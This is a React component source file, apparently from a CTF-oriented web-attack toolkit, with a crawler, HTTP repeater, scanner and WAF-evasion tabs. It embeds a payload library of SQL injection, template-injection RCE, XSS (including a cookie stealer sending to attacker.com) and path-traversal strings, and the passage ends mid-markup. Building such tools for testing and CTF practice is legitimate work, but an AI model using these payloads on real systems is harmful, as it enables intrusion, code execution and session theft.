import React, { useState, useEffect } from 'react';
import { 
  Globe, 
  RefreshCw, 
  AlertCircle, 
  ShieldAlert, 
  Code2, 
  Zap, 
  Database, 
  FileCode, 
  Search, 
  Copy, 
  Check, 
  Terminal,
  ExternalLink,
  ShieldCheck,
  Flame,
  Key,
  Layers,
  Lock,
  Compass,
  History,
  Trash2,
  ArrowUpRight
} from 'lucide-react';
import { huntWeb, detectWaf, mutatePayload, analyzeJs, sendRepeater, scanVulnerabilities } from '../api/client';
import { FlagCard } from '../components/FlagCard';
import { useApp } from '../context/AppContext';

interface RepeaterHistoryItem {
  id: string;
  timestamp: string;
  url: string;
  method: string;
  headersRaw: string;
  body: string;
  status_code: number;
  latency_ms: number;
  flags_found?: string[];
  result?: any;
}

export const WebHunt: React.FC = () => {
  const { sendToTab, pipedData, clearPipedData } = useApp();
  const [activeSubTab, setActiveSubTab] = useState<'crawler' | 'repeater' | 'scanner' | 'waf' | 'js_hunter' | 'payloads'>('crawler');

  // --- 0. Burp Repeater State ---
  const [repUrl, setRepUrl] = useState('http://localhost:8000/health');
  const [repMethod, setRepMethod] = useState('GET');
  const [repHeadersRaw, setRepHeadersRaw] = useState('User-Agent: SHADOW-CAT/1.2.0\nAccept: application/json');
  const [repBody, setRepBody] = useState('');
  const [repLoading, setRepLoading] = useState(false);
  const [repResult, setRepResult] = useState<any>(null);
  const [repError, setRepError] = useState<string | null>(null);

  // Repeater History State
  const [repeaterHistory, setRepeaterHistory] = useState<RepeaterHistoryItem[]>(() => {
    try {
      const saved = localStorage.getItem('shadowcat_repeater_history');
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  useEffect(() => {
    if (pipedData && pipedData.targetTab === 'web') {
      if (pipedData.field === 'repeater_url') {
        setActiveSubTab('repeater');
        setRepUrl(pipedData.data);
      } else if (pipedData.field === 'repeater_body') {
        setActiveSubTab('repeater');
        setRepBody(pipedData.data);
      } else {
        setUrl(pipedData.data);
      }
      clearPipedData();
    }
  }, [pipedData]);

  // --- 0. Burp Scanner State ---
  const [scanUrl, setScanUrl] = useState('http://localhost:8000');
  const [scanLoading, setScanLoading] = useState(false);
  const [scanResult, setScanResult] = useState<any>(null);
  const [scanError, setScanError] = useState<string | null>(null);

  // --- 1. Crawler State ---
  const [url, setUrl] = useState('');
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<any>(null);
  const [error, setError] = useState<string | null>(null);

  // --- 2. WAF State ---
  const [wafUrl, setWafUrl] = useState('');
  const [wafLoading, setWafLoading] = useState(false);
  const [wafResult, setWafResult] = useState<any>(null);
  const [wafError, setWafError] = useState<string | null>(null);

  const [rawPayload, setRawPayload] = useState("' UNION SELECT 1,2,3--");
  const [mutating, setMutating] = useState(false);
  const [mutatedVariants, setMutatedVariants] = useState<any[]>([]);

  // --- 3. JS Hunter State ---
  const [jsSourceMode, setJsSourceMode] = useState<'url' | 'code'>('url');
  const [jsTargetUrl, setJsTargetUrl] = useState('');
  const [jsRawCode, setJsRawCode] = useState('');
  const [jsLoading, setJsLoading] = useState(false);
  const [jsResult, setJsResult] = useState<any>(null);
  const [jsError, setJsError] = useState<string | null>(null);

  // --- 4. Payloads Library State ---
  const [payloadCategory, setPayloadCategory] = useState<'all' | 'sqli' | 'ssti' | 'xss' | 'lfi'>('all');
  const [searchFilter, setSearchFilter] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // Copy helper
  const handleCopy = (payload: string, id: string) => {
    navigator.clipboard.writeText(payload);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  // 0. Burp Repeater Handler
  const handleRepeaterSend = async () => {
    if (!repUrl.trim()) return;
    setRepLoading(true);
    setRepError(null);
    setRepResult(null);

    const headersObj: Record<string, string> = {};
    repHeadersRaw.split('\n').forEach(line => {
      const idx = line.indexOf(':');
      if (idx > 0) {
        headersObj[line.substring(0, idx).trim()] = line.substring(idx + 1).trim();
      }
    });

    try {
      const data = await sendRepeater(repUrl.trim(), repMethod, headersObj, {}, repBody || undefined);
      setRepResult(data);

      // Save to Repeater Request History
      const histItem: RepeaterHistoryItem = {
        id: Math.random().toString(36).substring(2, 9),
        timestamp: new Date().toLocaleTimeString(),
        url: repUrl.trim(),
        method: repMethod,
        headersRaw: repHeadersRaw,
        body: repBody,
        status_code: data.status_code,
        latency_ms: data.latency_ms,
        flags_found: data.flags_found || [],
        result: data
      };
      setRepeaterHistory(prev => {
        const updated = [histItem, ...prev.slice(0, 19)];
        localStorage.setItem('shadowcat_repeater_history', JSON.stringify(updated));
        return updated;
      });
    } catch (err: any) {
      setRepError(err.message || 'Repeater request failed');
    } finally {
      setRepLoading(false);
    }
  };

  const restoreHistoryItem = (item: RepeaterHistoryItem) => {
    setRepUrl(item.url);
    setRepMethod(item.method);
    setRepHeadersRaw(item.headersRaw || '');
    setRepBody(item.body || '');
    if (item.result) {
      setRepResult(item.result);
    }
  };

  const clearHistory = () => {
    setRepeaterHistory([]);
    localStorage.removeItem('shadowcat_repeater_history');
  };

  // 0. Burp Scanner Handler
  const handleStartScan = async () => {
    if (!scanUrl.trim()) return;
    setScanLoading(true);
    setScanError(null);
    setScanResult(null);

    try {
      const data = await scanVulnerabilities(scanUrl.trim());
      setScanResult(data);
    } catch (err: any) {
      setScanError(err.message || 'Vulnerability scanning failed');
    } finally {
      setScanLoading(false);
    }
  };

  // 1. Crawler Action
  const handleHunt = async () => {
    if (!url.trim()) return;
    setLoading(true);
    setError(null);
    setResult(null);

    try {
      const data = await huntWeb(url.trim());
      setResult(data);
    } catch (err: any) {
      setError(err.message || 'Web hunting failed');
    } finally {
      setLoading(false);
    }
  };

  // 2. WAF Actions
  const handleWafProbe = async () => {
    if (!wafUrl.trim()) return;
    setWafLoading(true);
    setWafError(null);
    setWafResult(null);

    try {
      const data = await detectWaf(wafUrl.trim());
      setWafResult(data);
    } catch (err: any) {
      setWafError(err.message || 'WAF probing failed');
    } finally {
      setWafLoading(false);
    }
  };

  const handleMutatePayload = async (payloadToMutate?: string) => {
    const text = payloadToMutate || rawPayload;
    if (!text.trim()) return;
    setMutating(true);
    try {
      const data = await mutatePayload(text.trim());
      setMutatedVariants(data.variants || []);
    } catch (err: any) {
      console.error(err);
    } finally {
      setMutating(false);
    }
  };

  // 3. JS Hunter Action
  const handleAnalyzeJs = async () => {
    setJsLoading(true);
    setJsError(null);
    setJsResult(null);

    try {
      const target = jsSourceMode === 'url' ? jsTargetUrl.trim() : '';
      const code = jsSourceMode === 'code' ? jsRawCode.trim() : '';
      const data = await analyzeJs(target, code);
      setJsResult(data);
    } catch (err: any) {
      setJsError(err.message || 'JavaScript analysis failed');
    } finally {
      setJsLoading(false);
    }
  };

  // Injection Payloads Data
  const injectionPayloads = [
    {
      id: 'sqli_auth_1',
      category: 'sqli',
      title: 'SQLi Auth Bypass (Classic OR)',
      desc: 'Bypasses standard username/password login queries',
      payload: "' OR '1'='1' -- -",
    },
    {
      id: 'sqli_auth_2',
      category: 'sqli',
      title: 'SQLi Auth Bypass (Admin Comment)',
      desc: 'Logs in directly as admin account',
      payload: "admin' -- -",
    },
    {
      id: 'sqli_union_cols',
      category: 'sqli',
      title: 'UNION Column Probe (NULLs)',
      desc: 'Increment NULL count until no error to find column count',
      payload: "' UNION SELECT NULL, NULL, NULL -- -",
    },
    {
      id: 'sqli_union_tables',
      category: 'sqli',
      title: 'MySQL / MariaDB Extract Tables',
      desc: 'Dumps all table names from current database',
      payload: "' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database() -- -",
    },
    {
      id: 'sqli_union_columns',
      category: 'sqli',
      title: 'MySQL Extract Column Names',
      desc: 'Extract column names for target table',
      payload: "' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='users' -- -",
    },
    {
      id: 'sqli_sqlite_schema',
      category: 'sqli',
      title: 'SQLite Master Schema Extract',
      desc: 'Dumps complete table definitions from sqlite_master',
      payload: "' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE type='table' -- -",
    },
    {
      id: 'sqli_time_sleep',
      category: 'sqli',
      title: 'Time-Based Blind Sleep (5s)',
      desc: 'Tests for blind SQL injection via 5-second delay',
      payload: "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) -- -",
    },
    {
      id: 'ssti_probe',
      category: 'ssti',
      title: 'SSTI Polyglot Verification',
      desc: 'If output renders 49, target is vulnerable to template injection',
      payload: "{{7*7}} ${7*7} <%= 7*7 %> #{7*7}",
    },
    {
      id: 'ssti_jinja_cat_flag',
      category: 'ssti',
      title: 'Flask / Jinja2 Cat Flag',
      desc: 'Uses Python subprocess/os popen via __globals__ to read flag',
      payload: "{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag*').read() }}",
    },
    {
      id: 'ssti_jinja_id',
      category: 'ssti',
      title: 'Flask / Jinja2 Subclass RCE',
      desc: 'Universal Python RCE via object subclasses',
      payload: "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}",
    },
    {
      id: 'ssti_twig_php',
      category: 'ssti',
      title: 'PHP Twig Filter RCE',
      desc: 'Executes system commands via Twig filter callback',
      payload: "{{['id']|filter('system')}}",
    },
    {
      id: 'ssti_ejs_node',
      category: 'ssti',
      title: 'Node.js EJS ExecSync',
      desc: 'Executes command via Node.js child_process in EJS',
      payload: "<%= global.process.mainModule.require('child_process').execSync('id') %>",
    },
    {
      id: 'xss_img_onerror',
      category: 'xss',
      title: 'Image OnError (WAF Bypass)',
      desc: 'Triggers immediately without script tags',
      payload: "<img src=x onerror=alert(document.domain)>",
    },
    {
      id: 'xss_svg_onload',
      category: 'xss',
      title: 'SVG OnLoad Vector',
      desc: 'Compact SVG payload that evades naive tag filters',
      payload: "<svg/onload=alert(1)>",
    },
    {
      id: 'xss_cookie_stealer',
      category: 'xss',
      title: 'Cookie Exfiltration Fetch',
      desc: 'Sends active session cookie to an attacker server',
      payload: "<script>fetch('http://attacker.com/log?c='+encodeURIComponent(document.cookie))</script>",
    },
    {
      id: 'lfi_etc_passwd',
      category: 'lfi',
      title: 'Standard Linux /etc/passwd',
      desc: 'Deep traversal path to verify local file disclosure',
      payload: "../../../../../../../../etc/passwd",
    },
    {
      id: 'lfi_null_byte',
      category: 'lfi',
      title: 'PHP < 5.3.4 Null Byte Traversal',
      desc: 'Truncates forced .php extension via URL null byte',
      payload: "../../../../../../../../etc/passwd%00",
    },
    {
      id: 'lfi_php_filter_b64',
      category: 'lfi',
      title: 'PHP Filter Base64 Read Source',
      desc: 'Extracts full PHP source code encoded in Base64',
      payload: "php://filter/convert.base64-encode/resource=index.php",
    },
    {
      id: 'lfi_proc_self_environ',
      category: 'lfi',
      title: 'Apache /proc/self/environ LFI to RCE',
      desc: 'Inject PHP code into User-Agent and include /proc/self/environ',
      payload: "../../../../../../../../proc/self/environ",
    },
  ];

  const filteredPayloads = injectionPayloads.filter((item) => {
    const matchesCat = payloadCategory === 'all' || item.category === payloadCategory;
    const matchesSearch =
      item.title.toLowerCase().includes(searchFilter.toLowerCase()) ||
      item.payload.toLowerCase().includes(searchFilter.toLowerCase()) ||
      item.desc.toLowerCase().includes(searchFilter.toLowerCase());
    return matchesCat && matchesSearch;
  });

  return (
    <div className="space-y-6">
      {/* Top Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-cyber-border pb-5">
        <div>
          <h2 className="text-xl font-bold text-white flex items-center gap-2">
            <Globe className="w-5 h-5 text-cyber-cyan" />
            Web Security & Attack Surface Hub
          </h2>
          <p className="text-gray-400 text-xs font-mono mt-1">
            Automated flag hunter · WAF fingerprint prober · Payload evasion mutator · JS secret analyzer
          </p>
        </div>

        {/* Sub-tab Navigation */}
        <div className="flex bg-cyber-darker border border-cyber-border rounded-xl p-1 shrink-0 overflow-x-auto">
          <button
            onClick={() => setActiveSubTab('crawler')}
            className={`flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-bold font-mono transition-all ${
              activeSubTab === 'crawler'
                ? 'bg-cyber-cyan text-black shadow-sm'
                : 'text-gray-400 hover:text-white'
            }`}
          >
            <Compass className="w-3.5 h-3.5" />
            Recon & Flag
          </button>
          <button
            onClick={() => setActiveSubTab('repeater')}
            className={`flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-bold font-mono transition-all ${
              activeSubTab === 'repeater'
                ? 'bg-cyber-cyan text-black shadow-sm'
                : 'text-gray-400 hover:text-white'
            }`}
          >
            <Terminal className="w-3.5 h-3.5" />
            Burp Repeater
          </button>
          <button
            onClick={() => setActiveSubTab('scanner')}
            className={`flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-bold font-mono transition-all ${
              activeSubTab === 'scanner'
                ? 'bg-cyber-cyan text-black shadow-sm'
                : 'text-gray-400 hover:text-white'
            }`}
          >
            <ShieldCheck className="w-3.5 h-3.5" />
            Burp Scanner
          </button>
          <button
            onClick={() => {
              setActiveSubTab('waf');
              if (mutatedVariants.length === 0) handleMutatePayload();
            }}
            className={`flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-bold font-mono transition-all ${
              activeSubTab === 'waf'
                ? 'bg-cyber-cyan text-black shadow-sm'
                : 'text-gray-400 hover:text-white'
            }`}
          >
            <ShieldAlert className="w-3.5 h-3.5" />
            WAF & Evasion
          </button>
          <button
            onClick={() => setActiveSubTab('js_hunter')}
            className={`flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-bold font-mono transition-all ${
              activeSubTab === 'js_hunter'
                ? 'bg-cyber-cyan text-black shadow-sm'
                : 'text-gray-400 hover:text-white'
            }`}
          >
            <Key className="w-3.5 h-3.5" />
            JS Secret Hunter
          </button>
          <button
            onClick={() => setActiveSubTab('payloads')}
            className={`flex items-center gap-2 px-3 py-1.5 rounded-lg text-xs font-bold font-mono transition-all ${
              activeSubTab === 'payloads'
                ? 'bg-cyber-cyan text-black shadow-sm'
                : 'text-gray-400 hover:text-white'
            }`}
          >
            <Zap className="w-3.5 h-3.5" />
            Payload Matrix
          </button>
        </div>
      </div>

      {/* ============================================================== */}
      {/* SUB-TAB 1: Crawler & Flag Hunter */}
      {/* ============================================================== */}
      {activeSubTab === 'crawler' && (
        <div className="space-y-6">
          <div className="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-4">
            <h3 className="text-white font-bold text-sm uppercase font-mono flex items-center gap-2">
              <Globe className="w-4 h-4 text-cyber-cyan" /> Target Endpoint Exploration
            </h3>
            <div className="flex flex-col sm:flex-row gap-3">
              <input
                type="text"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && handleHunt()}
                placeholder="http://10.10.11.x:8080 or https://target-ctf.com"
                className="flex-1 bg-cyber-darker border border-cyber-border rounded-lg px-4 py-2 text-sm text-white placeholder-gray-500 font-mono focus:outline-none focus:border-cyber-cyan"
              />
              <button
                onClick={handleHunt}
                disabled={loading}
                className="flex items-center justify-center gap-2 px-6 py-2 rounded-lg bg-cyber-cyan hover:bg-cyber-cyan/90 text-black font-bold font-mono text-sm transition-all shrink-0 disabled:opacity-50"
              >
                {loading ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Globe className="w-4 h-4" />}
                {loading ? 'Auditing...' : 'Start Audit'}
              </button>
            </div>
            {error && (
              <div className="p-3 bg-red-950/30 border border-red-500/30 rounded-lg text-red-400 text-xs font-mono flex items-center gap-2">
                <AlertCircle className="w-4 h-4 shrink-0" />
                {error}
              </div>
            )}
          </div>

          {result && (
            <div className="space-y-4 font-mono text-xs">
              {result.flags_found && result.flags_found.length > 0 && (
                <div className="space-y-2">
                  <h4 className="text-emerald-400 font-bold uppercase flex items-center gap-1.5">
                    <ShieldCheck className="w-4 h-4" /> Captured Flags
                  </h4>
                  <FlagCard flags={result.flags_found} source={`Target: ${url}`} />
                </div>
              )}

              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                <div className="bg-cyber-card border border-cyber-border rounded-xl p-3">
                  <div className="text-gray-500">Status</div>
                  <div className="text-white font-bold text-sm mt-0.5">{result.status_code || 200}</div>
                </div>
                <div className="bg-cyber-card border border-cyber-border rounded-xl p-3">
                  <div className="text-gray-500">Endpoints</div>
                  <div className="text-cyber-cyan font-bold text-sm mt-0.5">{result.found_paths?.length || 0}</div>
                </div>
                <div className="bg-cyber-card border border-cyber-border rounded-xl p-3">
                  <div className="text-gray-500">HTML Comments</div>
                  <div className="text-yellow-400 font-bold text-sm mt-0.5">{result.comments?.length || 0}</div>
                </div>
                <div className="bg-cyber-card border border-cyber-border rounded-xl p-3">
                  <div className="text-gray-500">Server</div>
                  <div className="text-gray-300 font-bold text-sm mt-0.5 truncate">{result.server || 'Generic'}</div>
                </div>
              </div>

              {result.found_paths && result.found_paths.length > 0 && (
                <div className="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2">
                  <h4 className="text-cyber-cyan font-bold uppercase">Discovered Paths</h4>
                  <div className="flex flex-wrap gap-2">
                    {result.found_paths.map((p: string, i: number) => (
                      <span key={i} className="px-2.5 py-1 bg-cyber-darker border border-cyber-border rounded text-gray-300 font-mono">
                        {p}
                      </span>
                    ))}
                  </div>
                </div>
              )}

              {result.comments && result.comments.length > 0 && (
                <div className="bg-cyber-card border border-cyber-border rounded-xl p-4 space-y-2">
                  <h4 className="text-yellow-400 font-bold uppercase">Extracted HTML Comments</h4>
                  <div className="space-y-2">
                    {result.comments.map((c: string, i: number) => (
                      <pre key={i} className="bg-cyber-darker p-2.5 rounded border border-cyber-border text-yellow-200 select-all whitespace-pre-wrap">
                        {c}
                      </pre>
                    ))}
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {/* ============================================================== */}
      {/* SUB-TAB: Burp Suite-Grade HTTP Repeater */}
      {/* ============================================================== */}
      {activeSubTab === 'repeater' && (
        <div className="space-y-6 font-mono text-xs">
          <div className="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-white font-bold text-sm uppercase flex items-center gap-2">
                <Terminal className="w-4 h-4 text-cyber-cyan" />
                In-App HTTP Request Repeater
              </h3>
              <span className="text-[10px] text-gray-500">Arbitrary Request Construction & Latency Telemetry</span>
            </div>

            {/* URL & Method Bar */}
            <div className="flex flex-col sm:flex-row gap-2">
              <select
                value={repMethod}
                onChange={(e) => setRepMethod(e.target.value)}
                className="bg-cyber-darker border border-cyber-border rounded-lg px-3 py-2 text-white font-bold text-xs focus:outline-none focus:border-cyber-cyan"
              >
                <option value="GET">GET</option>
                <option value="POST">POST</option>
                <option value="PUT">PUT</option>
                <option value="DELETE">DELETE</option>
                <option value="PATCH">PATCH</option>
                <option value="HEAD">HEAD</option>
                <option value="OPTIONS">OPTIONS</option>
              </select>
              <input
                type="text"
                value={repUrl}
                onChange={(e) => setRepUrl(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && handleRepeaterSend()}
                placeholder="http://10.10.11.x:8080/api/endpoint"
                className="flex-1 bg-cyber-darker border border-cyber-border rounded-lg px-4 py-2 text-white placeholder-gray-500 text-xs focus:outline-none focus:border-cyber-cyan"
              />
              <button
                onClick={handleRepeaterSend}
                disabled={repLoading}
                className="flex items-center justify-center gap-2 px-6 py-2 rounded-lg bg-cyber-cyan hover:bg-cyber-cyan/90 text-black font-bold text-xs transition-all shrink-0 disabled:opacity-50 cursor-pointer"
              >
                {repLoading ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Terminal className="w-3.5 h-3.5" />}
                {repLoading ? 'Sending...' : 'Send Request'}
              </button>
            </div>

            {/* Repeater Request History Strip */}
            {repeaterHistory.length > 0 && (
              <div className="bg-cyber-darker border border-cyber-border rounded-lg p-3 space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-[10px] uppercase font-bold text-gray-400 flex items-center gap-1.5">
                    <History className="w-3.5 h-3.5 text-cyber-cyan" />
                    Repeater Request History ({repeaterHistory.length})
                  </span>
                  <button
                    onClick={clearHistory}
                    className="text-[10px] text-gray-500 hover:text-red-400 flex items-center gap-1 transition-colors cursor-pointer"
                  >
                    <Trash2 className="w-3 h-3" />
                    Clear History
                  </button>
                </div>
                <div className="flex items-center gap-2 overflow-x-auto pb-1">
                  {repeaterHistory.map((item) => {
                    const isSuccess = item.status_code >= 200 && item.status_code < 300;
                    const isClientErr = item.status_code >= 400 && item.status_code < 500;
                    return (
                      <button
                        key={item.id}
                        onClick={() => restoreHistoryItem(item)}
                        className="px-2.5 py-1.5 rounded bg-black/50 border border-cyber-border hover:border-cyber-cyan text-left shrink-0 transition-all group flex items-center gap-2 cursor-pointer"
                        title="Click to restore this request and view past response"
                      >
                        <span className="text-[10px] font-bold text-gray-300 font-mono">{item.method}</span>
                        <span className={`text-[10px] px-1.5 py-0.2 rounded font-bold ${
                          isSuccess ? 'bg-emerald-950 text-emerald-400 border border-emerald-500/40' : isClientErr ? 'bg-yellow-950 text-yellow-400 border border-yellow-500/40' : 'bg-red-950 text-red-400 border border-red-500/40'
                        }`}>
                          {item.status_code}
                        </span>
                        <span className="text-[11px] text-gray-300 group-hover:text-white truncate max-w-[140px]">
                          {item.url.replace(/^https?:\/\/[^\/]+/, '') || '/'}
                        </span>
                        <span className="text-[10px] text-gray-500">{item.latency_ms}ms</span>
                        {item.flags_found && item.flags_found.length > 0 && (
                          <span className="px-1 py-0.2 rounded bg-emerald-500 text-black text-[9px] font-bold">
                            FLAG!
                          </span>
                        )}
                      </button>
                    );
                  })}
                </div>
              </div>
            )}

            {/* Headers & Body Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="text-[10px] uppercase text-gray-400 font-bold block mb-1">Request Headers (One per line)</label>
                <textarea
                  value={repHeadersRaw}
                  onChange={(e) => setRepHeadersRaw(e.target.value)}
                  rows={4}
                  className="w-full bg-cyber-darker border border-cyber-border rounded-lg p-2.5 text-xs text-cyan-200 focus:outline-none focus:border-cyber-cyan font-mono"
                  placeholder="Header-Name: Value"
                />
              </div>
              <div>
                <label className="text-[10px] uppercase text-gray-400 font-bold block mb-1">Request Payload Body (JSON, Form, Raw)</label>
                <textarea
                  value={repBody}
                  onChange={(e) => setRepBody(e.target.value)}
                  rows={4}
                  className="w-full bg-cyber-darker border border-cyber-border rounded-lg p-2.5 text-xs text-yellow-200 focus:outline-none focus:border-cyber-cyan font-mono"
                  placeholder="{'param': 'value'} or user=admin&pass=123"
                />
              </div>
            </div>

            {repError && (
              <div className="p-3 bg-red-950/30 border border-red-500/30 rounded-lg text-red-400 text-xs flex items-center gap-2">
                <AlertCircle className="w-4 h-4 shrink-0" />
                {repError}
              </div>
            )}
          </div>

          {/* Repeater Response View */}
          {repResult && (
            <div className="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-4">
              <div className="flex flex-wrap items-center justify-between gap-3 border-b border-cyber-border pb-3">
                <div className="flex items-center gap-2">
                  <span className={`px-2.5 py-1 rounded font-bold text-xs ${
                    repResult.status_code >= 200 && repResult.status_code < 300 
                      ? 'bg-emerald-950/60 text-emerald-400 border border-emerald-500/40' 
                      : repResult.status_code >= 300 && repResult.status_code < 400 
                      ? 'bg-yellow-950/60 text-yellow-400 border border-yellow-500/40' 
                      : 'bg-rose-950/60 text-rose-400 border border-rose-500/40'
                  }`}>
                    {repResult.status_code} {repResult.status_text}
                  </span>
                  <span className="text-gray-400 text-[11px]">&bull; {repResult.latency_ms} ms</span>
                  <span className="text-gray-400 text-[11px]">&bull; {repResult.size_bytes} bytes</span>
                </div>
                {repResult.flags_found?.length > 0 && (
                  <span className="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-400 font-bold border border-emerald-500/40 text-[10px]">
                    FLAG CAPTURED ({repResult.flags_found.length})
                  </span>
                )}
              </div>

              {repResult.flags_found?.length > 0 && (
                <FlagCard flags={repResult.flags_found} source={`Repeater: ${repUrl}`} />
              )}

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <h4 className="text-[11px] font-bold uppercase text-gray-400 mb-1.5">Response Headers</h4>
                  <pre className="bg-cyber-darker p-3 rounded-lg border border-cyber-border text-cyan-300 text-[11px] overflow-x-auto max-h-72 select-all whitespace-pre-wrap">
                    {Object.entries(repResult.headers || {}).map(([k, v]) => `${k}: ${v}`).join('\n')}
                  </pre>
                </div>
                <div>
                  <h4 className="text-[11px] font-bold uppercase text-gray-400 mb-1.5">Response Body</h4>
                  <pre className="bg-cyber-darker p-3 rounded-lg border border-cyber-border text-gray-200 text-[11px] overflow-x-auto max-h-72 select-all whitespace-pre-wrap">
                    {repResult.body || '(Empty Body)'}
                  </pre>
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* ============================================================== */}
      {/* SUB-TAB: Burp Suite-Grade Active Vulnerability Scanner */}
      {/* ============================================================== */}
      {activeSubTab === 'scanner' && (
        <div className="space-y-6 font-mono text-xs">
          <div className="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-white font-bold text-sm uppercase flex items-center gap-2">
                <ShieldCheck className="w-4 h-4 text-cyber-cyan" />
                Active Web Vulnerability Scanner
              </h3>
              <span className="text-[10px] text-gray-500">LFI &bull; SSTI &bull; SQLi Error &bull; Exposed Files &bull; Security Headers</span>
            </div>

            <div className="flex flex-col sm:flex-row gap-3">
              <input
                type="text"
                value={scanUrl}
                onChange={(e) => setScanUrl(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && handleStartScan()}
                placeholder="http://10.10.11.x:8080 or https://target-app.com"
                className="flex-1 bg-cyber-darker border border-cyber-border rounded-lg px-4 py-2 text-white placeholder-gray-500 text-xs focus:outline-none focus:border-cyber-cyan"
              />
              <button
                onClick={handleStartScan}
                disabled={scanLoading}
                className="flex items-center justify-center gap-2 px-6 py-2 rounded-lg bg-emerald-500 hover:bg-emerald-400 text-black font-bold text-xs transition-all shrink-0 disabled:opacity-50 cursor-pointer"
              >
                {scanLoading ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <ShieldCheck className="w-3.5 h-3.5" />}
                {scanLoading ? 'Scanning Target...' : 'Start Vuln Scan'}
              </button>
            </div>

            {scanError && (
              <div className="p-3 bg-red-950/30 border border-red-500/30 rounded-lg text-red-400 text-xs flex items-center gap-2">
                <AlertCircle className="w-4 h-4 shrink-0" />
                {scanError}
              </div>
            )}
          </div>

          {/* Scanner Findings */}
          {scanResult && (
            <div className="space-y-4">
              <div className="flex items-center justify-between bg-cyber-card border border-cyber-border rounded-xl p-4">
                <div className="flex items-center gap-3">
                  <div className="text-2xl font-bold text-white">{scanResult.total_findings}</div>
                  <div>
                    <div className="font-bold text-slate-200">Security Findings Discovered</div>
                    <div className="text-[10px] text-gray-500">{scanResult.probes_run} heuristic probes executed against {scanResult.target_url}</div>
                  </div>
                </div>
              </div>

              {scanResult.findings?.length === 0 ? (
                <div className="bg-cyber-card border border-emerald-500/30 rounded-xl p-8 text-center text-emerald-400">
                  <ShieldCheck className="w-8 h-8 mx-auto mb-2 opacity-80" />
                  <div className="font-bold">No standard high-severity vulnerabilities identified on tested endpoints.</div>
                </div>
              ) : (
                <div className="space-y-3">
                  {scanResult.findings.map((f: any, idx: number) => {
                    const sevColor = f.severity === 'CRITICAL' 
                      ? 'border-rose-500/50 bg-rose-950/20 text-rose-300' 
                      : f.severity === 'HIGH' 
                      ? 'border-orange-500/50 bg-orange-950/20 text-orange-300' 
                      : f.severity === 'MEDIUM' 
                      ? 'border-yellow-500/50 bg-yellow-950/20 text-yellow-300' 
                      : 'border-cyan-500/50 bg-cyan-950/20 text-cyan-300';
                    return (
                      <div key={idx} className={`p-4 rounded-xl border ${sevColor} space-y-2`}>
                        <div className="flex items-center justify-between">
                          <span className="font-bold text-sm text-white flex items-center gap-2">
                            <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-black/60 border border-current">{f.severity}</span>
                            {f.title}
                          </span>
                          <span className="text-[10px] text-gray-400 uppercase">{f.category}</span>
                        </div>
                        <p className="text-gray-300 text-xs">{f.description}</p>
                        {f.evidence && (
                          <div className="bg-black/60 p-2 rounded text-[11px] text-gray-300 border border-gray-800 select-all">
                            <span className="text-gray-500 font-bold block text-[10px]">EVIDENCE:</span>
                            {f.evidence}
                          </div>
                        )}
                        {f.url && (
                          <div className="text-[10px] text-cyan-400 select-all truncate">
                            Target Vector: {f.url}
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {/* ============================================================== */}
      {/* SUB-TAB 2: WAF Detector & Payload Evasion (from ShadowCat) */}
      {/* ============================================================== */}
      {activeSubTab === 'waf' && (
        <div className="space-y-6 font-mono text-xs">
          {/* Section 1: Target WAF Prober */}
          <div className="bg-cyber-card border border-cyber-border rounded-xl p-5 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-white font-bold text-sm uppercase flex items-center gap-2">
                <ShieldAlert className="w-4 h-4 text-cyber-cyan" />
                Target WAF Fingerprint Prober
              </h3>
              <span className="px-2 py-0.5 rounded bg-black/60 border border-cyber-border text-gray-400 text-[10px]">
                Active Probe Engine
              </span>
            </div>
            <p className="text-gray-400 text-xs">
              Transmits a targeted adversarial HTTP request to classify Cloudflare, AWS WAF, ModSecurity, Imperva, Sucuri, and F5 BIG-IP signatures.
            </p>

            <div className="flex flex-col sm:flex-row gap-3">
              <input
                type="text"
                value={wafUrl}
                onChange={(e) => setWafUrl(e.target.value)}
                onKeyDown={(e) => e.key === 'Enter' && handleWafProbe()}
                placeholder="https://target.com or http://10.10.11.x"
